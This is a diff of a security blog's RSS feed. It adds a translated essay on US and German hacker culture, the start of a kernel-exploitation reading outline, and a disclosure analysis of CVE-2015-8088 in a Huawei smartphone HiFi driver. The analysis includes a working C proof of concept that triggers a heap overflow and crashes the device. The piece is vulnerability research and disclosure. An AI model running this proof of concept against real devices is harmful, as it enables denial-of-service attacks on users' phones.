@@ -2,13 +2,711 @@
 <rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
   <channel>
     <title>Hardened GNU/Linux</title>
-    <description>We are a group of free software enthusiasts, anarchists, cyber security researchers. Long live anarchy! Long live 0ld sch00l!!!
+    <description>We are a group of free software enthusiasts, anarchists, cyber security researchers. Long live anarchy! Long live 0ld sch00l!!! A small step in security hardening --&gt; A giant leap in Free &amp; Open source software!!!
 </description>
     <link>http://www.hardenedlinux.org/</link>
     <atom:link href="http://www.hardenedlinux.org/feed.xml" rel="self" type="application/rss+xml"/>
-    <pubDate>Wed, 04 Nov 2015 12:47:37 +0800</pubDate>
-    <lastBuildDate>Wed, 04 Nov 2015 12:47:37 +0800</lastBuildDate>
+    <pubDate>Sat, 13 Feb 2016 14:46:49 +0800</pubDate>
+    <lastBuildDate>Sat, 13 Feb 2016 14:46:49 +0800</lastBuildDate>
     <generator>Jekyll v2.5.3</generator>
+    
+      <item>
+        <title>HACKERS AND HEROES: A TALE OF TWO COUNTRIES</title>
+        <description>&lt;p&gt;原文地址 &lt;a href=&quot;http://hackaday.com/2016/01/11/hackers-and-heroes-a-tale-of-two-countries/&quot;&gt;HACKERS AND HEROES: A TALE OF TWO COUNTRIES&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;译者：n3o4po11o&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/german-america.jpg&quot; alt=&quot;german-america&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;从很多方面来说，德国与美国的黑客文化都很相似，从软硬结合类型到相近的业余无线电到Blinkenlights。通过阅读Hackaday，你会发现两个国家都有类似的项目出现。在过去的10年中，两个国家都有大量黑客空间(hackerspace)出现。可能在你生活的城市中就有一两个:)。但生活在美国的黑客还缺少了一个德国黑客已经拥有的东西：尊重。&lt;/p&gt;
+
+&lt;p&gt;在不同的圈子里提到”黑客”这个词，你永远不知道会得到什么样的回应。什么样的人才能算是”黑客”呢？是我们所提到的那些在Ashley Madison（婚外情网站）上通过账户信息来勒索的人吗？或者是从Target那里盗窃信用卡的那些人呢？还是那些花了大量的时间来破坏东西、创建东西以及拆解东西只是为了看看它们是如何工作的人？&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/hacker_montage.png&quot; alt=&quot;hacker-montage&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;关于”谁是&lt;a href=&quot;http://catb.org/~esr/jargon/html/H/hacker.html&quot;&gt;黑客&lt;/a&gt;“的讨论是一个非常古老的议题，当然了是基于互联网的标准，但它的含义不止步于此。但如果你仔细回想一下最近一次在主流媒体中听到关于”黑客”这个词，但不是贬义的情况。如果在本世纪你无法回想起这样的情况，那么你生活在美国。如果你回答”就昨天，刚在国内最重要的报纸中看到”，那么你生活在德国。&lt;/p&gt;
+
+&lt;h2 id=&quot;section&quot;&gt;黑客在社会中的地位&lt;/h2&gt;
+
+&lt;p&gt;激发我写这些的文章题为”&lt;a href=&quot;https://translate.google.com/translate?sl=auto&amp;amp;tl=en&amp;amp;js=y&amp;amp;prev=_t&amp;amp;hl=en&amp;amp;ie=UTF-8&amp;amp;u=http%3A%2F%2Fwww.sueddeutsche.de%2Fdigital%2Fchaos-computer-club-warum-hacker-so-wichtig-fuer-die-gesellschaft-sind-1.2798088&amp;amp;edit-text=&amp;amp;act=url&quot;&gt;为什么黑客对社会这么重要(Why Hackers are so Important for Society)&lt;/a&gt;.”我们彼此都心知肚明，因为我们将一个东西拆解以后从最底层来了解整个东西的原理：从消费电子到加密协议。但回过头来想想，如果是从美国的报纸上读到关于黑客的头条呢？   &lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/800px-piratenpartei_deutschland_logo-svg.png&quot; alt=&quot;Pirate-party&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;德国黑客受到了很多的尊重，德国政府经常在IT安全，电子投票机，数据自由以及其他类似的领域采纳混沌计算机俱乐部&lt;a href=&quot;http://ccc.de/en&quot;&gt;(Chaos Computer Club,CCC)&lt;/a&gt;的意见。当CCC有故事要发布时，那些媒体，甚至和计算机无关的媒体都会去。海盗聚会(The Pirate Party)，由名为c-base的黑客空间所创办，在2012获得了足够高的投票在4个州议会有了议席，并在欧洲议会有了一个议席。当然了不是没一个德国人都觉得“”黑客”是好的，但从媒体的态度、政治以及社会影响上来看比起美国好了太多。   &lt;/p&gt;
+
+&lt;p&gt;值得思考的是，这是如何实现的以及有什么建议可以给美国的黑客圈子。我没办法说我有所有的答案。部分的文章是为了通过比较引出一个话题。但重要的是思考为什么美国的黑客会被排斥而在德国的黑客就(几乎)和社会的普通群体一样呢，特别是在公开辩论需要更多的技术背景的情况下。   &lt;/p&gt;
+
+&lt;h2 id=&quot;hacking-on-the-phone&quot;&gt;HACKING ON THE PHONE&lt;/h2&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/war_games.jpg&quot; alt=&quot;War-games&quot; /&gt;
+© Metro-Goldwyn-Mayer Studios Inc. All Rights Reserved.&lt;/p&gt;
+
+&lt;p&gt;旁边这张美国黑客的照片是一个男人，甚至可能是一个青少年，独自一人接连几个小时试图攻破AT&amp;amp;T公司的系统或者在玩&lt;a href=&quot;https://en.wikipedia.org/wiki/WarGames&quot;&gt;War Game&lt;/a&gt;。在20世纪80年代这样的行为没有太大的错误，当然除了孤独的那部分。当时有一群人(phone phreaks)黑了电话，使其能够用来(非法)拨打免费电话。但他们通常团伙行动，彼此分享信息。免费的信息共享在&lt;a href=&quot;https://en.wikipedia.org/wiki/Legion_of_Doom_%28hacking%29&quot;&gt;毁灭军团(Legion of Doom’s)&lt;/a&gt;创办的&lt;a href=&quot;http://www.textfiles.com/magazines/LOD/&quot;&gt;杂志&lt;/a&gt;,&lt;a href=&quot;http://phrack.org/&quot;&gt;Phrack&lt;/a&gt;,&lt;a href=&quot;http://www.2600.com/&quot;&gt;2600&lt;/a&gt;以及无数的论坛(BBSes)中，并且都是开放的，但如果你访问过，这将是一个非常令人激动的事。   &lt;/p&gt;
+
+&lt;p&gt;在当时，AT&amp;amp;T对长途电话进行垄断，并且价格很不合理。为了让一群志同道合的技术黑客能够一起进行交流，或者拨入境外的论坛，他们几乎必须要闯入AT&amp;amp;T的系统。这也成就了电话网络为当时最有趣也最富有挑战性的信息技术。但常见的关于电话phreaks的帖子都围绕着让彼此能够通信，也止步于此。&lt;/p&gt;
+
+&lt;p&gt;德国黑客当时也处于非常类似的情况。德国也有电话垄断，但它比美国的AT&amp;amp;T限制性更大。在德国，不仅你只有一个电话运营商(&lt;a href=&quot;https://en.wikipedia.org/wiki/Deutsche_Bundespost&quot;&gt;Deutsche Bundespost&lt;/a&gt;)，而且运营商还是联邦政府所拥有的，也是当时最大的雇主。Bundespost可以通过法律要求用户使用特定的设备来接入网络,其中包含了一个在80年代来说贵得离谱的调制解调器(modem)。CCC早期有一些关于电话phreaking是针对Bundespost，这些的话，我将它归到”肯定会对其的合法性与道德产生争议”的目录，但这些活动同样将价格可接受的DIY modem带到了平常人的生活在，让他们能够彼此通信。虽然这个行为在法律上不合法，但我觉得在道德上是正确的，并且从技术上来说，这样的东西太酷了。&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/akustikkoppler_ccc_datenklo.jpg&quot; alt=&quot;Datenklo&quot; /&gt;
+Photo: Johann H. Addicks / addicks@gmx.net   &lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;http://www.offiziere.ch/trust-us/habi1/097_datenklo.html&quot;&gt;Datenklo&lt;/a&gt;(&lt;a href=&quot;https://translate.google.com/translate?sl=auto&amp;amp;tl=en&amp;amp;js=y&amp;amp;prev=_t&amp;amp;hl=en&amp;amp;ie=UTF-8&amp;amp;u=http%3A%2F%2Fwww.offiziere.ch%2Ftrust-us%2Fhabi1%2F097_datenklo.html&amp;amp;edit-text=&amp;amp;act=url&quot;&gt;谷歌翻译版&lt;/a&gt;)是一个运行在300比特率基于声音耦合的DIY modem。它的名字由”数据(data)”和”厕所(toilet)”两个单词混合而成。因为用来隔绝话筒的橡胶环和厕所密封管道用的材料大小是一样的。&lt;/p&gt;
+
+&lt;p&gt;不好意思，跑题了;-)20世纪80年代早期在美国和德国的黑客行为主要分为”合法”以及”没那么合法”，人群主要为那些热爱探索技术以及热爱数字通信与打印媒体的人。当时所有人都通过电话phreaking来对抗运营商的垄断，因此他们能够聚在一起在背后偷偷谈论电话系统是如何运作并不被发现。因为当时最酷的就是进入电话系统。&lt;/p&gt;
+
+&lt;p&gt;但接下来旅程变得不一样了。在20世纪90年代，美国的黑客们被排斥并且大多都分散在不同的地方，与此同时德国黑客们已经形成了一个强大的全国性组织，并在几个城市有了分舵。&lt;/p&gt;
+
+&lt;h3 id=&quot;the-turn&quot;&gt;转变(THE TURN)&lt;/h3&gt;
+
+&lt;p&gt;在美国，电话phreaking的黄金时代在1990年结束了，因为当时美国特勤局查封了很多用来架设论坛以及为黑客们提供服务的服务器。绝大部分的电话飞客(phreacks)都潜入地下了。黑客小组被当作“黑帮”来对待，并且在论坛上讨论电话系统内部的原理的人越来越多是为了犯罪而不是为了普通交流。数百台运行着可疑论坛的电脑被扣押数个月到数年，有的甚至都没有被起诉！于此同时美国政府将之前实施的用于保护政府电脑的法律&lt;a href=&quot;https://en.wikipedia.org/wiki/United_States_v._Morris_%281991%29&quot;&gt;延伸到了在互联网上的每一台电脑&lt;/a&gt;。
+&lt;img src=&quot;/images/us-secretservice-starlogo.png&quot; alt=&quot;US-Secret-Services&quot; /&gt;
+总的来说，这些事让美国的hacking”一夜回到解放前”。Hacking被认为是犯罪的行为，很多黑客团队都解散了，甚至有一小部分人遭受了牢狱之灾。Hacking在美国的所有社区都发生了翻天覆地的变化，至少有一段时间变得寂静，或者被迫要在地下世界里才拥有一片小天地。Bruce Sterling的&lt;a href=&quot;https://stuff.mit.edu/hacker/hacker.html&quot;&gt;The Hacker Crackdown&lt;/a&gt;在phreaking的后黄金时代是一本非常经典的编年史。&lt;/p&gt;
+
+&lt;p&gt;在1990年，回过头来看&lt;a href=&quot;http://www.nytimes.com/1981/07/26/business/case-of-the-purloined-password.html?pagewanted=3&amp;amp;pagewanted=all&quot;&gt;纽约时报在1981年&lt;/a&gt;对于黑客已经”过时”的描述，不仅让人感到悲伤：&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;黑客为技术上的专家;技艺精湛，通常很年轻，程序员，总是带着奇思秒想来试探计算机系统的防御系统，总是探寻着机器的极限和可能性，尽管他们总是看起来像是在破坏系统，在计算机行业中是重要的资产，通常来说非常有价值。   &lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;公众的舆论已经将黑客认为是离经叛道的人或者是罪犯。&lt;/p&gt;
+
+&lt;h3 id=&quot;l0pht-heavy-industries&quot;&gt;L0PHT HEAVY INDUSTRIES&lt;/h3&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/l0pht_logo.gif&quot; alt=&quot;L0pht&quot; /&gt;
+但黑客总要hack点东西，大量根据地理分布而聚集在一起的黑客团队放弃了本地的活动。在20世纪90年代，&lt;a href=&quot;http://www.l0pht.com/&quot;&gt;L0pht&lt;/a&gt;为地上世界“存在”的黑客团队。但问题是这个“l0pht”和常见的黑客空间(hackerspace)一样:full of junk (ahem, inspirational technological raw material) and computers and smart folks interested in all of the above.&lt;/p&gt;
+
+&lt;p&gt;在早期，L0pht有一堆好的文章，比如下面这篇&lt;a href=&quot;http://www.nytimes.com/1999/10/03/magazine/hack-counterhack.html?scp=2&amp;amp;sq=l0pht%20heavy&amp;amp;st=cse&quot;&gt;纽约时报上的文章&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;可能美国的黑客与政府关系的高潮是当我们看到l0pht里的7个成员在美国参议院里为自己涉及美国国家安全的&lt;a href=&quot;https://www.youtube.com/watch?v=VVJldn_MmMY&quot;&gt;活动作证&lt;/a&gt;。参议员Fred Thompson为了减少打击介绍他们为“黑客智库”给其他参议员。有趣的是，最开始L0pht与政府扯上关系只是一个由&lt;a href=&quot;https://www.youtube.com/watch?v=axnWyPEly84&amp;amp;t=11m42s&quot;&gt;Mudge实施的防御演习&lt;/a&gt;，是为了提升名气并避免任何误解（不想被抓）。   &lt;/p&gt;
+
+&lt;p&gt;来自L0pht的人们最后成为了Full Disclosure的早期拥护者，不管是&lt;a href=&quot;https://en.wikipedia.org/wiki/Responsible_disclosure&quot;&gt;负责任的揭露&lt;/a&gt;还是其他的形式。在20世纪90年代，他们的advisories是每一个对hacking和计算机安全有兴趣的人必读的读物。尽管L0pht所从事的事情并非所有都是严格意义上来说合法的，但可以确定的事他们正在做正确的事：正处于混沌中立与混沌善良之间。华盛顿邮报写了一个&lt;a href=&quot;http://www.washingtonpost.com/sf/business/2015/06/22/net-of-insecurity-part-3/&quot;&gt;关于l0pht的文章&lt;/a&gt;应该在你的阅读列表当中。&lt;/p&gt;
+
+&lt;p&gt;我觉得l0pht最厉害的事为他们成为了一个“存在实体”的团队，而且他们对于修复有问题的东西有着强烈的动力，因为他们在公众中有着很高的知名度，所以他们清楚他们正在被监视。and there was an incentive to “behave” or at least to appear to be behaving. They got flack from both the black-hat hacker community for having “sold out” and from the software industry for being rogues.这是他们脚踏黑白两道的标志。而且，他们是有组织有计划的。   &lt;/p&gt;
+
+&lt;p&gt;接着，L0pht停止经营成一个hackerspace，转而成为一个安全企业。他们成员根据自己商业模式不同都分离出去了。可以这么说，L0pht这个团队的后期，根据利益点的不同，有的成为hacking认证的商业公司，有的成为安全企业。在20世纪90年代后的美国，”hacking”在商业上并不成功。白帽黑客（也就是我们所知的“安全研究员”）和黑帽黑客之间的分歧越来越明显。一面是高薪，一面是合法的环境，在这样的大环境下，留给像l0pht这样处于中间的机会已经不多了。这对于美国的黑客文化是一个非常危险坑，特别是对于那些没有足够的水平到喜欢玩弄计算机的年轻人。在整个文化中，他们要处于什么位置呢？&lt;/p&gt;
+
+&lt;h3 id=&quot;today-the-usa-tomorrow-germany&quot;&gt;TODAY THE USA, TOMORROW GERMANY&lt;/h3&gt;
+
+&lt;p&gt;在美国的黑客文化中，从开放和社区化到全面潜入地下(underground)绕了很长的远路(除了剩下几个在公众的视野当中)。明天，我将从19世纪80年代开始，讲述同一时期德国的黑客历史，讨论一下两国的黑客场景以及美国的黑客可以从中学习的地方。如果你同意这个观点，在美国的黑客场景下还有很多工作可以做。敬请期待。&lt;/p&gt;
+</description>
+        <pubDate>Sat, 13 Feb 2016 06:05:05 +0800</pubDate>
+        <link>http://www.hardenedlinux.org/translation/2016/02/13/Hackers-and-heroes-a-tale-of-two-countries.html</link>
+        <guid isPermaLink="true">http://www.hardenedlinux.org/translation/2016/02/13/Hackers-and-heroes-a-tale-of-two-countries.html</guid>
+        
+        
+        <category>translation</category>
+        
+      </item>
+    
+      <item>
+        <title>CVE-2015-8088: 华为智能手机HiFi驱动堆溢出</title>
+        <description>&lt;p&gt;Shawn：感谢Pray3r的分享，驱动一直以来都是linux内核的重灾区，要以不断修复bug的方式去防御漏洞几乎是1990年代的方案，另外一方面，作为厂商也应该加大代码审计的投入。这篇分析的&lt;a href=&quot;https://raw.githubusercontent.com/citypw/DNFWAH/master/5/d5_0x03_DNFWAH_cve-2015-8088-heap-overflow-analysis.txt&quot;&gt;英文版已经分享到了DNFWAH Issue 5&lt;/a&gt;上。&lt;/p&gt;
+
+&lt;p&gt;By Pray3r&lt;/p&gt;
+
+&lt;h3 id=&quot;description&quot;&gt;Description&lt;/h3&gt;
+&lt;p&gt;&lt;code&gt;/dev/hifi_misc&lt;/code&gt; 是用户空间到内核空间中Hisi 芯片的一个接口，该接口和Hifi相关。我们看到&lt;code&gt;drivers/hisi/hifidsp/hifi_lpp.c&lt;/code&gt;中的代码，攻击者可以在用户空间下，可以使用&lt;code&gt;HIFI_MISC_IOCTL_WRITE_PARAMS&lt;/code&gt;参数，并通过调用&lt;code&gt;ioctl()&lt;/code&gt;执行到该代码路径：&lt;/p&gt;
+
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;static long hifi_misc_ioctl(struct file *fd, unsigned int cmd, unsigned long arg)
+{
+[...]
+	switch(cmd) {
+		[...]
+		case HIFI_MISC_IOCTL_WRITE_PARAMS : /* write algo param to hifi*/
+			ret = hifi_dsp_write_param(arg);
+		        break;
+		[...]
+	}
+[...]
+}&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;之后，&lt;code&gt;hifi_dsp_write_param()&lt;/code&gt;函数被调用，它的参数来自用户空间：&lt;/p&gt;
+
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;int hifi_dsp_write_param(unsigned long arg)
+{
+	int ret = OK;
+	phys_addr_t hifi_param_phy_addr = 0;
+	void*		hifi_param_vir_addr = NULL;
+	CARM_HIFI_DYN_ADDR_SHARE_STRU* hifi_addr = NULL;
+	struct misc_io_sync_param para;
+[...]
+	if (copy_from_user(&lt;span class=&quot;err&quot;&gt;&amp;amp;&lt;/span&gt;para, (void*)arg, sizeof(struct misc_io_sync_param))) {  // arg --&amp;gt; para
+		loge(&amp;quot;copy_from_user fail.\n&amp;quot;);
+		ret = ERROR;
+		goto error1;
+	}
+[...]
+	hifi_param_vir_addr = (unsigned char*)ioremap(hifi_param_phy_addr, SIZE_PARAM_PRIV); // heap alloc
+	if (NULL == hifi_param_vir_addr) {
+		loge(&amp;quot;hifi_param_vir_addr ioremap fail\n&amp;quot;);
+		ret = ERROR;
+		goto error2;
+	}
+[...]
+	ret = copy_from_user(hifi_param_vir_addr, para.para_in, para.para_size_in); // heap overflow
+	if ( ret != 0) {
+		loge(&amp;quot;copy data to hifi error! ret = %d&amp;quot;, ret);
+	}
+[...]
+}&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;参数&lt;code&gt;arg&lt;/code&gt;是一个结构体指针，指向用户空间的内存。&lt;code&gt;hifi_dsp_write_param()&lt;/code&gt;函数初始化之后，使用&lt;code&gt;copy_from_user()&lt;/code&gt;将用户空间的数据&lt;code&gt;(arg)&lt;/code&gt;拷贝到内核空间中&lt;code&gt;(para)&lt;/code&gt;。注意，它没做任何验证，就将用户空间下的所用的成员变量拷贝到内核空间中。&lt;code&gt;para&lt;/code&gt;结构如下：&lt;/p&gt;
+
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;struct misc_io_sync_param {
+	void *                  para_in;          
+	unsigned int            para_size_in;      
+	void *                  para_out;          
+	unsigned int            para_size_out;  
+};&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;紧接着，又调用了&lt;code&gt;copy_from_user(hifi_param_vir_addr,
+  para.para_in, para.para_size_in)&lt;/code&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;code&gt;hifi_param_vir_addr&lt;/code&gt;指向一块由&lt;code&gt;ioremap()&lt;/code&gt;分配的堆内存，这块堆内存的大小为&lt;code&gt;SIZE_PARAM_PRIV&lt;/code&gt;(200 * 1024)字节。&lt;/li&gt;
+  &lt;li&gt;&lt;code&gt;para.para_in&lt;/code&gt;指针由用户空间控制，它是存储数据的内存。&lt;/li&gt;
+  &lt;li&gt;&lt;code&gt;para.para_size_in&lt;/code&gt;是一个&lt;code&gt;unsigned int&lt;/code&gt;由用户空间控制，它是&lt;code&gt;para.para_in&lt;/code&gt;的大小。&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;然而，代码中没有对&lt;code&gt;para.para_in&lt;/code&gt;和&lt;code&gt;para.para_size_in&lt;/code&gt;进行验证，如果&lt;code&gt;para.para_size_in&lt;/code&gt;大于&lt;code&gt;200 * 1024&lt;/code&gt;,例如&lt;code&gt;300 * 1024&lt;/code&gt;，将产生一个堆溢出。PoC如下：&lt;/p&gt;
+
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;/*
+ *
+ *  HuaWei Mate7 hifi driver Poc
+ *
+ *  Writen by pray3r&lt;span class=&quot;nt&quot;&gt;&amp;lt;pray3r.z&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;gmail&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;com&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
+ *
+ */
+
+#include &lt;span class=&quot;nt&quot;&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;
+#include &lt;span class=&quot;nt&quot;&gt;&amp;lt;stdlib.h&amp;gt;&lt;/span&gt;
+#include &lt;span class=&quot;nt&quot;&gt;&amp;lt;fcntl.h&amp;gt;&lt;/span&gt;
+#include &lt;span class=&quot;nt&quot;&gt;&amp;lt;sys&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;types&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;h&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
+#include &lt;span class=&quot;nt&quot;&gt;&amp;lt;sys&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;stat&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;h&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
+#include &lt;span class=&quot;nt&quot;&gt;&amp;lt;sys&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;ioctl&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;h&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
+
+#define HIFI_MISC_IOCTL_WRITE_PARAMS    _IOWR(&amp;#39;A&amp;#39;, 0x75, struct misc_io_sync_param)
+
+struct misc_io_sync_param {
+	void *                  para_in;           
+	unsigned int            para_size_in;       
+	void *                  para_out;           
+	unsigned int            para_size_out;   
+};
+
+int main(int arg, char **argv)
+{
+	int fd; 
+	void *in = malloc(300 * 1024);
+	void *out = malloc(100);
+	struct misc_io_sync_param poc;
+
+	poc.para_in = in;
+	poc.para_size_in = 300 * 1024;
+	poc.para_out = out;
+	poc.para_size_out = 100;
+
+	fd = open(&amp;quot;/dev/hifi_misc&amp;quot;, O_RDWR);
+
+	ioctl(fd, HIFI_MISC_IOCTL_WRITE_PARAMS, &lt;span class=&quot;ni&quot;&gt;&amp;amp;poc);&lt;/span&gt;
+
+	free(in);
+	free(out);
+
+	return 0;
+}&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;执行这个PoC将导致Mate 7崩溃，请注意，该PoC至少需要在audio或system用户下执行，因为&lt;code&gt;/dev/hifi_misc&lt;/code&gt;在audio和system用户下才有可写的权限。&lt;/p&gt;
+
+&lt;h3 id=&quot;impact&quot;&gt;Impact&lt;/h3&gt;
+
+&lt;p&gt;给&lt;code&gt;para.para_size&lt;/code&gt;设置一个很大的值，手机会崩溃，但是想利用这个漏洞提权是非常困难的，因为在&lt;code&gt;ioremap()&lt;/code&gt;[1]的实现调用了&lt;code&gt;get_vm_area_node()&lt;/code&gt;，这个函数总是会设置PAGE_SIZE大小的保护页。&lt;/p&gt;
+
+&lt;p&gt;感谢Dan Rosenberg的指点。[2]&lt;/p&gt;
+
+&lt;h3 id=&quot;affected&quot;&gt;Affected&lt;/h3&gt;
+
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;Model   : HUAWEI MT7-TL10
+Version : MT7-TL10V100R001CHNC00B133
+Android : 4.4.2
+Kernel  : 3.10.30-00015-g049a08f&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;其它类似的华为手机可能也受影响。&lt;/p&gt;
+
+&lt;h3 id=&quot;patch&quot;&gt;Patch&lt;/h3&gt;
+
+&lt;p&gt;参考华为官网的信息： &lt;br /&gt;
+ &lt;a href=&quot;http://www1.huawei.com/en/security/psirt/security-bulletins/security-advisories/hw-460347.htm&quot;&gt;http://www1.huawei.com/en/security/psirt/security-bulletins/security-advisories/hw-460347.htm&lt;/a&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;timeline&quot;&gt;TimeLine&lt;/h3&gt;
+
+&lt;p&gt;Sep 28 2015 - Report sent to Huawei PSIRT &lt;br /&gt;
+ Sep 10 2015 - Huawei confirmed the security issues &lt;br /&gt;
+ Nov 04 2015 - Huawei fixed and public the security issues &lt;br /&gt;
+ Nov 09 2015 - Update CVE number   &lt;/p&gt;
+
+&lt;h3 id=&quot;reference&quot;&gt;Reference&lt;/h3&gt;
+&lt;p&gt;[1]. http://lxr.free-electrons.com/source/mm/vmalloc.c#L1351
+[2]. http://seclists.org/oss-sec/2015/q4/532&lt;/p&gt;
+</description>
+        <pubDate>Wed, 20 Jan 2016 10:46:24 +0800</pubDate>
+        <link>http://www.hardenedlinux.org/system-security/2016/01/20/cve-2015-8088-analysis.html</link>
+        <guid isPermaLink="true">http://www.hardenedlinux.org/system-security/2016/01/20/cve-2015-8088-analysis.html</guid>
+        
+        
+        <category>system-security</category>
+        
+      </item>
+    
+      <item>
+        <title>An Introduction to Linux Kernel Exploitation</title>
+        <description>&lt;p&gt;By Pray3r&lt;/p&gt;
+
+&lt;h3 id=&quot;about-this-documentation&quot;&gt;-[ 0. About this documentation&lt;/h3&gt;
+&lt;p&gt;I am researching linux kernel exploitation for the outline and reference books/papers. I will keep update this list and share some of my findings on &lt;a href=&quot;http://hardenedlinux.org&quot;&gt;HardenedLinux&lt;/a&gt;. If you have any questions or suggestions don’t hesitate to contact &lt;a href=&quot;&amp;#109;&amp;#097;&amp;#105;&amp;#108;&amp;#116;&amp;#111;:&amp;#112;&amp;#114;&amp;#097;&amp;#121;&amp;#051;&amp;#114;&amp;#046;&amp;#122;&amp;#064;&amp;#103;&amp;#109;&amp;#097;&amp;#105;&amp;#108;&amp;#046;&amp;#099;&amp;#111;&amp;#109;&quot;&gt;me&lt;/a&gt;.&lt;/p&gt;
+
+&lt;h3 id=&quot;review&quot;&gt;-[ 1. Review&lt;/h3&gt;
+&lt;ul&gt;
+  &lt;li&gt;Linux Memory Management&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h3 id=&quot;exploitation&quot;&gt;-[ 2. Exploitation&lt;/h3&gt;
+
+&lt;h4 id=&quot;attack-surface&quot;&gt;-[ 2.1 Attack Surface&lt;/h4&gt;
+
+&lt;h4 id=&quot;a-taxonomy-of-kernel-vulnerabilities&quot;&gt;-[ 2.2 A Taxonomy of Kernel Vulnerabilities&lt;/h4&gt;
+
+&lt;h4 id=&quot;finding-vulnsbugs&quot;&gt;-[ 2.3 Finding VULNS/BUGS&lt;/h4&gt;
+
+&lt;h5 id=&quot;fuzzing&quot;&gt;-[ 2.3.1 Fuzzing&lt;/h5&gt;
+&lt;p&gt;Reading/Modifying these tools’ code, and I try to write new one.
+- &lt;a href=&quot;https://github.com/kernelslacker/trinity&quot;&gt;trinity&lt;/a&gt;
+- &lt;a href=&quot;https://github.com/google/kasanf&quot;&gt;kasan&lt;/a&gt;&lt;/p&gt;
+
+&lt;h5 id=&quot;code-audit&quot;&gt;-[ 2.3.2 Code Audit&lt;/h5&gt;
+
+&lt;h4 id=&quot;kernel-exploitation&quot;&gt;-[ 2.4 Kernel Exploitation&lt;/h4&gt;
+
+&lt;h4 id=&quot;bypass-self-protection-stable-exploit&quot;&gt;-[ 2.5 Bypass Self-protection (Stable Exploit)&lt;/h4&gt;
+
+&lt;h3 id=&quot;reference-books&quot;&gt;-[ 3. Reference Books&lt;/h3&gt;
+&lt;ul&gt;
+  &lt;li&gt;Linux Kernel Development, 3rd Edition – &lt;em&gt;Robert Love&lt;/em&gt; [&lt;a href=&quot;http://www.amazon.com/Linux-Kernel-Development-3rd-Edition/dp/0672329468&quot;&gt;Amazon&lt;/a&gt;]&lt;/li&gt;
+  &lt;li&gt;Understand Linux Kernel, 3rd Edition – &lt;em&gt;Daniel P. Bovet, Marco Cesati&lt;/em&gt; [&lt;a href=&quot;http://www.amazon.com/Understanding-Linux-Kernel-Third-Edition/dp/0596005652&quot;&gt;Amazon&lt;/a&gt;]&lt;/li&gt;
+  &lt;li&gt;Linux Device Drivers, 3rd  Edition – &lt;em&gt;Jonathan Corbet, Alessandro Rubini, Greg Kroah-Hartman&lt;/em&gt; [&lt;a href=&quot;http://www.amazon.com/Linux-Device-Drivers-3rd-Edition/dp/0596005903&quot;&gt;Amazon&lt;/a&gt;]&lt;/li&gt;
+  &lt;li&gt;Understanding Linux Network Internals – &lt;em&gt;Christian Benvenuti&lt;/em&gt; [&lt;a href=&quot;http://www.amazon.com/Understanding-Network-Internals-Christian-Benvenuti/dp/0596002556&quot;&gt;Amazon&lt;/a&gt;]&lt;/li&gt;
+  &lt;li&gt;Understanding The Linux Virtual Memory Manager – &lt;em&gt;Mel Gorman&lt;/em&gt; [&lt;a href=&quot;http://www.amazon.ca/Understanding-Linux-Virtual-Memory-Manager/dp/0131453483&quot;&gt;Amazon&lt;/a&gt;]&lt;/li&gt;
